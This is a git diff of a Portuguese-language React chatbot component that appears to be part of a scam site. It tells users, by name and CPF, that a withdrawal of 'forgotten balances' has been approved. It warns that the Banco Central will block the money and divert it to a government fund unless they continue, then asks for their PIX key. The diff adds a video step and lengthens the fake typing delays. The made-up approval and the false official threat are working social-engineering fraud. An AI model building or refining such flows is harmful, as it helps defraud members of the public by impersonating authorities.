@@ -95,24 +95,33 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
         setTyping(false);
         addBotMessage(`Parabéns, ${name}! A sua solicitação de saque foi aprovada no valor de ${formattedVal} referentes a saldos esquecidos no CPF ${data.docValue}.`, undefined, "/assets/banners/banner_saque_aprovado.png");
         
-        // Show second message faster
+        // Show second message (Video explicativo se houver)
         setTimeout(() => {
           setTyping(true);
           setTimeout(() => {
             setTyping(false);
-            addBotMessage(`ATENÇÃO: Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central. Caso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos. Observação: Isso só acontecerá se você não concluir a etapa a seguir.`, undefined, "/assets/banners/banner_atencao.png");
+            addBotMessage(`Assista ao vídeo abaixo para entender como realizar o saque do seu valor disponível:`, undefined, undefined, undefined, undefined, "/assets/banners/video_explicacao.mp4");
             
-            // Show third message faster
+            // Show third message
             setTimeout(() => {
               setTyping(true);
               setTimeout(() => {
                 setTyping(false);
-                addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`, undefined, "/assets/banners/banner_pix.png");
-                setAwaitingPix(true);
-              }, 400);
-            }, 300);
-          }, 400);
-        }, 300);
+                addBotMessage(`ATENÇÃO: Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central. Caso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos. Observação: Isso só acontecerá se você não concluir a etapa a seguir.`, undefined, "/assets/banners/banner_atencao.png");
+                
+                // Show fourth message
+                setTimeout(() => {
+                  setTyping(true);
+                  setTimeout(() => {
+                    setTyping(false);
+                    addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`, undefined, "/assets/banners/banner_pix.png");
+                    setAwaitingPix(true);
+                  }, 1500);
+                }, 2000);
+              }, 2500);
+            }, 2500);
+          }, 2000);
+        }, 2000);
       } catch (e) {
         setTyping(false);
         addBotMessage("Poxa, deu uma falha de conexão. Tenta recarregar a página, tá bom?");
@@ -122,8 +131,8 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
     setupChat();
   }, []);
 
-  const addBotMessage = (text: string, options?: any[], image?: string, customType?: string, audio?: string) => {
-    setMessages(prev => [...prev, { sender: "bot", text, options, image, customType, audio }]);
+  const addBotMessage = (text: string, options?: any[], image?: string, customType?: string, audio?: string, video?: string) => {
+    setMessages(prev => [...prev, { sender: "bot", text, options, image, customType, audio, video }]);
   };
 
   useEffect(() => {
@@ -380,6 +389,9 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
                     <>
                       {msg.image && (
                          <img src={msg.image} alt="Banner" className="w-full h-auto rounded-lg mb-3 shadow-sm object-cover" />
+                      )}
+                      {msg.video && (
+                         <video src={msg.video} controls playsInline className="w-full h-auto rounded-lg mb-3 shadow-sm object-cover" />
                       )}
                       {msg.text.split('\n').map((line:string, idx:number) => (
                          <p key={idx} className={`${idx !== 0 ? 'mt-2' : ''}`} dangerouslySetInnerHTML={{__html: line.replace(/\*\*(.*?)\*\*/g, '<strong class="text-white">$1</strong>')}} />
